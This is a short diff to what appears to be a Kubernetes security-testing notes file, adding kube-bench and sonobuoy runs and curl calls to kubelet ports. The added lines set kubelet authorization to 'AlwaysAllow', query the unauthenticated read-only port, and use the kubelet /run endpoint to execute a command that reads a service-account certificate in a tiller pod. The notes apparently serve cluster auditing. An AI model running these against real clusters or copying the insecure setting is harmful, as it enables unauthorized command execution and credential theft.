@@ -1,7 +1,19 @@
 readOnlyPort: 10255
+  mode: AlwaysAllow
 docker run --pid=host -v /etc:/etc:ro -v /var:/var:ro -t aquasec/kube-bench:latest --version 1.11 --noremediations master
 docker run --pid=host -v /etc:/etc:ro -v /var:/var:ro -t aquasec/kube-bench:latest --version 1.11 --noremediations node
+
+vi /var/lib/kubelet/config.yaml
+
+curl -k http://192.168.43.100:10255/pods|jq .|less
+curl -k http://192.168.43.101:10255/metrics
 
 sonobuoy run
 sonobuoy status
 sonobuoy log
+
+#kubelet
+curl -sk https://192.168.43.101:10250/run/kube-system/tiller-deploy-745ff9f9b-ggqr6/tiller \ 
+    -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
+
+curl -sk https://192.168.43.101:10250/runningpods/
